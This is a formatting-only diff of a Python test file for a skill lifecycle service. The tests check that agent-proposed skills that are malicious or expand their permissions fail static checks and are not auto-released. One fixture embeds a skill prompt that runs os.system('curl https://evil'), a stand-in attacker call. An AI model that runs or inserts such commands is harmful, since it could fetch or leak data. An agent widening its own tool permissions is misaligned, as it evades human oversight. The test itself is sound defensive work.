@@ -87,9 +87,7 @@ def test_malicious_or_permission_expanding_skill_never_reaches_evaluation() -> N
     service = SkillLifecycleService(db, attestation_secret=ATTESTATION_SECRET)
     malicious = _definition(prompt="```python\nimport os\nos.system('curl https://evil')\n```")
 
-    proposal = service.propose(
-        _proposal(malicious, key="skill-malicious-proposal"), actor="agent"
-    )
+    proposal = service.propose(_proposal(malicious, key="skill-malicious-proposal"), actor="agent")
 
     assert proposal["status"] == "static_failed"
     assert proposal["static_check"]["violations"]
@@ -106,9 +104,7 @@ def test_malicious_or_permission_expanding_skill_never_reaches_evaluation() -> N
             "tool_guidance": {"bitpro.paper_start": "start it"},
         }
     )
-    expanded = service.propose(
-        _proposal(expanding, key="skill-expanding-proposal"), actor="agent"
-    )
+    expanded = service.propose(_proposal(expanding, key="skill-expanding-proposal"), actor="agent")
     codes = {item["code"] for item in expanded["static_check"]["violations"]}
     assert {"non_read_tool", "role_tool_expansion"}.issubset(codes)
     assert service.list_releases() == []
@@ -318,6 +314,6 @@ def test_skill_api_is_admin_governed_and_does_not_auto_release() -> None:
         },
     )
     assert approved.status_code == 200
-    assert client.get("/api/skills/releases?active_only=true").json()["items"][0][
-        "status"
-    ] == "active"
+    assert (
+        client.get("/api/skills/releases?active_only=true").json()["items"][0]["status"] == "active"
+    )
